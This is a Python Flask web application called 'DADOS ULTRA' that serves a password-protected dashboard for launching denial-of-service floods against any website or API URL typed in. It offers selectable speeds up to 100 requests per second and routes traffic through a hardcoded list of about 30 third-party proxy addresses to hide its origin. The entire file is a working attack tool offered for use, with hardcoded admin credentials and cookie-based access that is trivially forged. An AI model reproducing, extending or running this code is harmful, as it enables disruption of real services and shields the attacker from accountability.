from flask import Flask, request, jsonify, render_template_string
import requests
import threading
import time
import random
from datetime import datetime

app = Flask(__name__)

# ============================================
# CONFIG
# ============================================
ADMIN_USER = "bronx"
ADMIN_PASS = "ultra2026"

# 🌍 PROXY LIST
PROXY_LIST = [
    "94.158.244.245:1080", "68.71.249.153:48606", "193.25.215.182:22222",
    "72.56.107.177:1080", "176.114.86.151:1080", "43.161.217.219:1080",
    "208.102.51.6:58208", "162.253.68.97:4145", "167.71.32.51:1080",
    "23.176.40.194:1080", "173.212.239.43:1080", "198.8.94.174:39078",
    "174.64.199.82:4145", "68.71.241.33:4145", "142.54.228.193:4145",
    "88.204.142.108:1080", "104.200.152.30:4145", "162.240.96.211:1080",
    "72.205.0.93:4145", "72.195.34.42:4145", "184.178.172.11:4145",
    "98.191.0.37:4145", "67.201.39.14:4145", "103.75.118.84:1080",
    "152.53.144.223:1080", "152.70.57.143:1080", "15.235.58.227:1080",
    "5.255.123.162:1080", "144.31.192.13:1080",
]

active_attacks = {}
attack_logs = []

# ============================================
# HTML
# ============================================
LOGIN_HTML = """
<!DOCTYPE html><html><head><title>DADOS ULTRA - Login</title>
<meta name="viewport" content="width=device-width,initial-scale=1.0">
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#000;display:flex;justify-content:center;align-items:center;min-height:100vh;font-family:monospace}
.box{background:#111;padding:40px;border-radius:20px;border:2px solid #ff0000;width:350px;text-align:center;box-shadow:0 0 50px #ff000066}
h1{color:#ff0000;font-size:2em;text-shadow:0 0 30px #ff0000;margin-bottom:20px}
input{width:100%;padding:15px;background:#000;border:1px solid #ff0000;border-radius:10px;color:#ff0000;margin:10px 0;font-family:monospace;font-size:14px}
.btn{width:100%;padding:15px;background:#ff0000;color:#fff;border:none;border-radius:10px;font-weight:bold;cursor:pointer;font-size:16px;margin-top:10px}
.btn:hover{box-shadow:0 0 30px #ff0000}
.error{color:#ff0000;margin-top:10px;font-size:12px}
</style></head><body>
<div class="box">
<h1>💀 DADOS ULTRA</h1>
<p style="color:#888;margin-bottom:20px">KILLER OSINT TOOL</p>
<form method="post">
<input type="text" name="user" placeholder="Username" required>
<input type="password" name="pass" placeholder="Password" required>
<button class="btn" type="submit">⚡ LOGIN</button>
</form>
{% if error %}<p class="error">{{ error }}</p>{% endif %}
</div></body></html>
"""

DASHBOARD_HTML = """
<!DOCTYPE html><html><head><title>DADOS ULTRA - Dashboard</title>
<meta name="viewport" content="width=device-width,initial-scale=1.0">
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#000;color:#ff0000;font-family:monospace;padding:15px}
.header{text-align:center;padding:20px;border:2px solid #ff0000;border-radius:15px;margin-bottom:20px;background:#111}
h1{font-size:2em;text-shadow:0 0 30px #ff0000}
.card{background:#111;border:1px solid #ff0000;border-radius:10px;padding:20px;margin:15px 0}
h3{color:#ff0000;margin-bottom:15px}
input,select{width:100%;padding:12px;background:#000;border:1px solid #ff0000;border-radius:8px;color:#ff0000;margin:8px 0;font-family:monospace}
label{color:#888;font-size:11px;display:block;margin-top:8px}
.btn{width:100%;padding:14px;background:#ff0000;color:#fff;border:none;border-radius:8px;font-weight:bold;cursor:pointer;margin:8px 0;font-size:14px}
.btn:hover{box-shadow:0 0 20px #ff0000}
.btn-green{background:#00cc44}
.btn-yellow{background:#ff8800;color:#000}
.btn-stop{background:#333;color:#ff0000}
.row{display:grid;grid-template-columns:1fr 1fr;gap:10px}
.badge{padding:5px 12px;border-radius:20px;font-size:10px;display:inline-block;margin:3px}
.running{background:#ff000033;color:#ff0000;animation:pulse 1s infinite}
@keyframes pulse{50%{opacity:0.5}}
.logs{background:#000;padding:10px;border-radius:5px;max-height:200px;overflow:auto;font-size:11px;margin-top:10px}
.log{color:#888;padding:3px 0;border-bottom:1px solid #111}
.proxy-count{color:#ff8800}
</style></head><body>
<div class="header">
<h1>💀 DADOS ULTRA</h1>
<p>API DDoS | Website DDoS | Killer OSINT</p>
<p class="proxy-count">🌍 {{ proxies }} Proxies Ready</p>
</div>

<div class="card">
<h3>🔥 API DDoS ATTACK</h3>
<div class="row">
<div><label>TARGET API URL</label><input type="text" id="apiUrl" placeholder="https://api.target.com/endpoint"></div>
<div><label>REQUESTS COUNT</label><input type="number" id="apiCount" value="100"></div>
</div>
<label>SPEED</label>
<select id="apiSpeed">
<option value="slow">🐢 Slow (1/sec)</option>
<option value="fast" selected>⚡ Fast (10/sec)</option>
<option value="veryfast">🔥 Very Fast (50/sec)</option>
<option value="ultra">💀 Ultra (100/sec)</option>
</select>
<button class="btn" onclick="startApiAttack()">🚀 LAUNCH API ATTACK</button>
<button class="btn btn-stop" onclick="stopAttack('api')">⏹️ STOP</button>
<div id="apiStatus"></div>
</div>

<div class="card">
<h3>🌐 WEBSITE DDoS ATTACK</h3>
<div class="row">
<div><label>TARGET WEBSITE URL</label><input type="text" id="webUrl" placeholder="https://target.com"></div>
<div><label>REQUESTS COUNT</label><input type="number" id="webCount" value="500"></div>
</div>
<label>SPEED</label>
<select id="webSpeed">
<option value="slow">🐢 Slow (1/sec)</option>
<option value="fast" selected>⚡ Fast (10/sec)</option>
<option value="veryfast">🔥 Very Fast (50/sec)</option>
<option value="ultra">💀 Ultra (100/sec)</option>
</select>
<button class="btn" onclick="startWebAttack()">🚀 LAUNCH WEB ATTACK</button>
<button class="btn btn-stop" onclick="stopAttack('web')">⏹️ STOP</button>
<div id="webStatus"></div>
</div>

<div class="card">
<h3>📜 ATTACK LOGS</h3>
<div class="logs" id="logs"></div>
</div>

<div style="text-align:center;margin-top:20px">
<a href="/logout" style="color:#ff0000">🚪 LOGOUT</a>
</div>

<script>
function startApiAttack(){
    const url=document.getElementById('apiUrl').value;
    const count=document.getElementById('apiCount').value;
    const speed=document.getElementById('apiSpeed').value;
    if(!url)return alert('Enter API URL!');
    fetch('/attack/api',{method:'POST',headers:{'Content-Type':'application/json'},
        body:JSON.stringify({url,count:parseInt(count),speed})})
    .then(r=>r.json()).then(d=>{
        document.getElementById('apiStatus').innerHTML=d.status==='started'?
            '<span class="badge running">⚡ ATTACKING...</span>':'<span>Error</span>';
        loadLogs();
    });
}
function startWebAttack(){
    const url=document.getElementById('webUrl').value;
    const count=document.getElementById('webCount').value;
    const speed=document.getElementById('webSpeed').value;
    if(!url)return alert('Enter Website URL!');
    fetch('/attack/web',{method:'POST',headers:{'Content-Type':'application/json'},
        body:JSON.stringify({url,count:parseInt(count),speed})})
    .then(r=>r.json()).then(d=>{
        document.getElementById('webStatus').innerHTML=d.status==='started'?
            '<span class="badge running">⚡ ATTACKING...</span>':'<span>Error</span>';
        loadLogs();
    });
}
function stopAttack(type){
    fetch('/stop/'+type,{method:'POST'}).then(r=>r.json()).then(d=>{
        document.getElementById(type+'Status').innerHTML='<span style="color:#888">⏹️ Stopped</span>';
        loadLogs();
    });
}
function loadLogs(){
    fetch('/logs').then(r=>r.json()).then(d=>{
        document.getElementById('logs').innerHTML=d.logs.map(l=>
            `<div class="log">${l}</div>`).join('');
    });
}
setInterval(loadLogs,2000);
loadLogs();
</script></body></html>
"""

# ============================================
# ATTACK FUNCTIONS
# ============================================
def send_request(url, proxy=None):
    try:
        proxies = {"http": f"http://{proxy}", "https": f"http://{proxy}"} if proxy else None
        requests.get(url, proxies=proxies, timeout=5)
        return True
    except:
        return False

def run_attack(attack_id, url, count, speed, use_proxy=True):
    speeds = {"slow": 1, "fast": 0.1, "veryfast": 0.02, "ultra": 0.01}
    delay = speeds.get(speed, 0.1)
    
    sent = 0
    failed = 0
    
    for i in range(count):
        if attack_id not in active_attacks:
            break
        
        proxy = random.choice(PROXY_LIST) if use_proxy else None
        
        if send_request(url, proxy):
            sent += 1
        else:
            failed += 1
        
        attack_logs.append(f"[{datetime.now().strftime('%H:%M:%S')}] {'✅' if proxy else '📡'} {'Proxy' if proxy else 'Direct'} | {'Sent' if proxy else 'OK'} ({sent}/{count})")
        if len(attack_logs) > 100:
            attack_logs.pop(0)
        
        time.sleep(delay)
    
    if attack_id in active_attacks:
        del active_attacks[attack_id]
        attack_logs.append(f"[DONE] Attack complete! Sent: {sent}, Failed: {failed}")

# ============================================
# ROUTES
# ============================================
@app.route('/', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        user = request.form.get('user', '')
        pwd = request.form.get('pass', '')
        if user == ADMIN_USER and pwd == ADMIN_PASS:
            return '<script>document.cookie="auth=true;path=/";location.href="/dashboard"</script>'
        return render_template_string(LOGIN_HTML, error="❌ Invalid credentials!")
    return render_template_string(LOGIN_HTML, error=None)

@app.route('/dashboard')
def dashboard():
    if request.cookies.get('auth') != 'true':
        return '<script>location.href="/"</script>'
    return render_template_string(DASHBOARD_HTML, proxies=len(PROXY_LIST))

@app.route('/attack/api', methods=['POST'])
def attack_api():
    if request.cookies.get('auth') != 'true':
        return jsonify({"error": "Unauthorized"}), 403
    
    data = request.get_json()
    url = data.get('url', '')
    count = data.get('count', 100)
    speed = data.get('speed', 'fast')
    
    if not url:
        return jsonify({"error": "URL required"}), 400
    
    attack_id = f"api_{int(time.time())}"
    active_attacks[attack_id] = True
    attack_logs.append(f"[START] API Attack: {url} | {count} requests | {speed}")
    
    thread = threading.Thread(target=run_attack, args=(attack_id, url, count, speed, True))
    thread.daemon = True
    thread.start()
    
    return jsonify({"status": "started", "id": attack_id})

@app.route('/attack/web', methods=['POST'])
def attack_web():
    if request.cookies.get('auth') != 'true':
        return jsonify({"error": "Unauthorized"}), 403
    
    data = request.get_json()
    url = data.get('url', '')
    count = data.get('count', 500)
    speed = data.get('speed', 'fast')
    
    if not url:
        return jsonify({"error": "URL required"}), 400
    
    attack_id = f"web_{int(time.time())}"
    active_attacks[attack_id] = True
    attack_logs.append(f"[START] Web Attack: {url} | {count} requests | {speed}")
    
    thread = threading.Thread(target=run_attack, args=(attack_id, url, count, speed, True))
    thread.daemon = True
    thread.start()
    
    return jsonify({"status": "started", "id": attack_id})

@app.route('/stop/<attack_type>', methods=['POST'])
def stop_attack(attack_type):
    to_remove = [k for k in active_attacks if k.startswith(attack_type)]
    for k in to_remove:
        del active_attacks[k]
    attack_logs.append(f"[STOP] {attack_type.upper()} attack stopped")
    return jsonify({"status": "stopped"})

@app.route('/logs')
def get_logs():
    return jsonify({"logs": attack_logs[-20:]})

@app.route('/logout')
def logout():
    return '<script>document.cookie="auth=false;path=/";location.href="/"</script>'

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=5000)
